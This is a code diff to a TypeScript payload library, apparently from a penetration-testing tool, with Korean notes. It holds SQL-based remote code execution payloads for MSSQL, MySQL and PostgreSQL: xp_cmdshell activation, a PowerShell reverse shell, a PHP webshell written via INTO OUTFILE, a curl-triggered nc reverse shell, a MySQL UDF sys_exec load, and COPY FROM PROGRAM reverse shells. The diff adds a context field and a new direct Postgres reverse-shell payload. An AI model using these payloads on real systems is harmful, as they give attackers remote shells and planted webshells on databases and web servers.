@@ -2,7 +2,15 @@
 // is a copy-only reference: nothing here sends a request or picks a payload
 // automatically, the user pastes it into the request editor and sends it
 // themselves.
-export type SqlPayload = { label: string; payload: string; note?: string };
+export type SqlPayload = {
+  label: string; payload: string; note?: string;
+  // Only meaningful on the RCE categories (postgres/mssql/mysql), which pair
+  // a "type this straight into a client you're already authenticated in"
+  // variant with a "break out of a vulnerable web parameter" variant of the
+  // same technique. Everything else is a bare injection fragment, not a
+  // full statement, so context is left undefined there.
+  context?: "direct" | "injection";
+};
 export type SqlPayloadCategory = {
   id: string;
   title: string;
@@ -115,13 +123,15 @@ export const sqlPayloadCategories: SqlPayloadCategory[] = [
     engines: ["mssql"],
     description: "sa/sysadmin 권한 계정에서만 동작합니다. 활성화 자체가 침해적이니 범위와 위험을 검토한 뒤 실행하세요.",
     payloads: [
-      { label: "고급 옵션 노출", payload: "EXEC sp_configure 'show advanced options',1; RECONFIGURE;" },
-      { label: "xp_cmdshell 활성화", payload: "EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;" },
-      { label: "명령 실행", payload: "EXEC xp_cmdshell 'whoami';" },
-      { label: "UNION으로 결과 유출",
+      { label: "고급 옵션 노출", context: "direct",
+        payload: "EXEC sp_configure 'show advanced options',1; RECONFIGURE;" },
+      { label: "xp_cmdshell 활성화", context: "direct",
+        payload: "EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;" },
+      { label: "명령 실행", context: "direct", payload: "EXEC xp_cmdshell 'whoami';" },
+      { label: "UNION으로 결과 유출", context: "injection",
         payload: "'; EXEC xp_cmdshell 'whoami'-- -",
         note: "결과가 응답에 안 보이면 stacked query 지원 여부와 out-of-band 방법을 검토." },
-      { label: "리버스 쉘 (PowerShell, 이미 실행 인터페이스가 있는 경우)",
+      { label: "리버스 쉘 (PowerShell, 이미 실행 인터페이스가 있는 경우)", context: "direct",
         payload: "EXEC xp_cmdshell 'powershell -nop -w hidden -c \"$c=New-Object " +
           "Net.Sockets.TCPClient(\\\"{LHOST}\\\",{LPORT});$s=$c.GetStream();" +
           "[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){" +
@@ -132,7 +142,7 @@ export const sqlPayloadCategories: SqlPayloadCategory[] = [
           "충돌을 피했습니다 -- 활성화(xp_cmdshell 활성화 항목)가 선행돼야 하고, 같은 포트로 " +
           "Enumeration 탭의 리버스 쉘 패널에서 리스너를 먼저 켜두세요. Defender가 켜져 있으면 " +
           "탐지될 수 있습니다." },
-      { label: "리버스 쉘 (인젝션 컨텍스트, stacked query)",
+      { label: "리버스 쉘 (인젝션 컨텍스트, stacked query)", context: "injection",
         payload: "'; EXEC xp_cmdshell 'powershell -nop -w hidden -c \"$c=New-Object " +
           "Net.Sockets.TCPClient(\\\"{LHOST}\\\",{LPORT});$s=$c.GetStream();" +
           "[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){" +
@@ -150,15 +160,16 @@ export const sqlPayloadCategories: SqlPayloadCategory[] = [
       "서비스해야 트리거할 수 있습니다. UDF(sys_exec)보다 조건은 간단하지만 웹 루트 경로를 " +
       "미리 알아야 합니다(기본값은 /var/www/html이지만 다를 수 있으니 먼저 확인하세요).",
     payloads: [
-      { label: "secure_file_priv 확인", payload: "SHOW VARIABLES LIKE 'secure_file_priv';",
+      { label: "secure_file_priv 확인", context: "direct",
+        payload: "SHOW VARIABLES LIKE 'secure_file_priv';",
         note: "빈 문자열이면 파일 쓰기 경로 제한이 없다는 뜻입니다. NULL이면 이 기법 자체가 " +
           "비활성화된 것입니다." },
-      { label: "PHP 웹셸 파일 쓰기 (이미 쿼리 인터페이스가 있는 경우)",
+      { label: "PHP 웹셸 파일 쓰기 (이미 쿼리 인터페이스가 있는 경우)", context: "direct",
         payload: "SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'" },
-      { label: "인젝션 컨텍스트 (UNION)",
+      { label: "인젝션 컨텍스트 (UNION)", context: "injection",
         payload: "' UNION SELECT '<?php system($_GET[\"cmd\"]); ?>',NULL,NULL INTO OUTFILE " +
           "'/var/www/html/shell.php'-- -" },
-      { label: "웹셸로 리버스 쉘 트리거 (curl)",
+      { label: "웹셸로 리버스 쉘 트리거 (curl)", context: "direct",
         payload: "curl 'http://TARGET/shell.php?cmd=rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|" +
           "/bin/sh+-i+2>%261|nc+{LHOST}+{LPORT}+>/tmp/f'",
         note: "TARGET을 대상 IP로 직접 바꾸세요(자동 채움 대상 아님). 같은 포트로 Enumeration " +
@@ -175,16 +186,17 @@ export const sqlPayloadCategories: SqlPayloadCategory[] = [
       "디렉터리에 심어 SQL에서 직접 명령을 실행하는 함수를 등록합니다. .so 자체를 SQL만으로 " +
       "만들 수는 없으므로 대상에 먼저 업로드해두는 별도 단계가 필요한 멀티스텝 기법입니다.",
     payloads: [
-      { label: "plugin 디렉터리 확인", payload: "SHOW VARIABLES LIKE 'plugin_dir';" },
-      { label: "업로드해둔 .so를 plugin 디렉터리로 복사",
+      { label: "plugin 디렉터리 확인", context: "direct",
+        payload: "SHOW VARIABLES LIKE 'plugin_dir';" },
+      { label: "업로드해둔 .so를 plugin 디렉터리로 복사", context: "direct",
         payload: "SELECT LOAD_FILE('/tmp/lib_mysqludf_sys.so') INTO DUMPFILE " +
           "'/usr/lib/mysql/plugin/lib_mysqludf_sys.so'",
         note: "/tmp/lib_mysqludf_sys.so는 이미 대상에 올려둔 컴파일된 라이브러리 경로로, " +
           "목적지는 위에서 확인한 실제 plugin_dir 값으로 바꾸세요." },
-      { label: "sys_exec 함수 등록",
+      { label: "sys_exec 함수 등록", context: "direct",
         payload: "CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so'" },
-      { label: "명령 실행", payload: "SELECT sys_exec('whoami');" },
-      { label: "리버스 쉘 실행",
+      { label: "명령 실행", context: "direct", payload: "SELECT sys_exec('whoami');" },
+      { label: "리버스 쉘 실행", context: "direct",
         payload: "SELECT sys_exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|" +
           "nc {LHOST} {LPORT} >/tmp/f');",
         note: "같은 포트로 Enumeration 탭의 리버스 쉘 패널에서 리스너를 먼저 켜두세요." },
@@ -198,12 +210,18 @@ export const sqlPayloadCategories: SqlPayloadCategory[] = [
       "COPY ... FROM PROGRAM은 DB 프로세스 권한으로 임의 OS 명령을 실행합니다 -- 명령 자리에 " +
       "리버스 쉘 페이로드(리버스 쉘 탭의 nc-mkfifo 등)를 넣으면 그대로 셸 연결로 이어집니다.",
     payloads: [
-      { label: "명령 실행 + 결과 조회 (이미 쿼리 인터페이스가 있는 경우)",
+      { label: "명령 실행 + 결과 조회 (이미 쿼리 인터페이스가 있는 경우)", context: "direct",
         payload: "CREATE TABLE cmd_exec(output text); COPY cmd_exec FROM PROGRAM 'whoami'; " +
           "SELECT * FROM cmd_exec;",
         note: "결과를 응답에서 바로 읽을 수 있을 때 (관리 콘솔, UNION 등). " +
           "테이블이 이미 있으면 DROP TABLE IF EXISTS cmd_exec;를 앞에 추가하세요." },
-      { label: "리버스 쉘 (인젝션 컨텍스트, stacked query)",
+      { label: "리버스 쉘 (이미 쿼리 인터페이스가 있는 경우)", context: "direct",
+        payload: "DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(output text); " +
+          "COPY cmd_exec FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|" +
+          "nc {LHOST} {LPORT} >/tmp/f';",
+        note: "psql 등으로 이미 인증된 상태에서 그대로 실행하세요 -- 같은 포트로 Enumeration " +
+          "탭의 리버스 쉘 패널에서 리스너를 먼저 켜두세요." },
+      { label: "리버스 쉘 (인젝션 컨텍스트, stacked query)", context: "injection",
         payload: "'; DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(output text); " +
           "COPY cmd_exec FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|" +
           "nc {LHOST} {LPORT} >/tmp/f';--",
@@ -230,3 +248,26 @@ export const sqlPayloadCategories: SqlPayloadCategory[] = [
 
 export const findSqlPayloadCategory = (id: string) =>
   sqlPayloadCategories.find((category) => category.id === id);
+
+// service.name values match nmap's own service-detection strings, same as
+// backend/templates/services.yaml's `database:` match list -- reused here
+// so a DB-shaped service (already authenticated, no injection point in
+// play) can offer only the "type this straight into the client" payloads,
+// never the break-out-of-a-web-parameter injection variants.
+const dbRceCategoryIds: Record<string, string[]> = {
+  postgresql: ["postgres-copy-program"],
+  mysql: ["mysql-outfile-webshell", "mysql-udf-rce"],
+  "ms-sql-s": ["mssql-xp-cmdshell"],
+};
+
+export function dbRceCategoriesFor(serviceName: string): SqlPayloadCategory[] {
+  const ids = dbRceCategoryIds[serviceName.toLowerCase()];
+  if (!ids) return [];
+  return ids
+    .map((id) => findSqlPayloadCategory(id))
+    .filter((category): category is SqlPayloadCategory => !!category)
+    .map((category) => ({
+      ...category,
+      payloads: category.payloads.filter((item) => item.context !== "injection"),
+    }));
+}
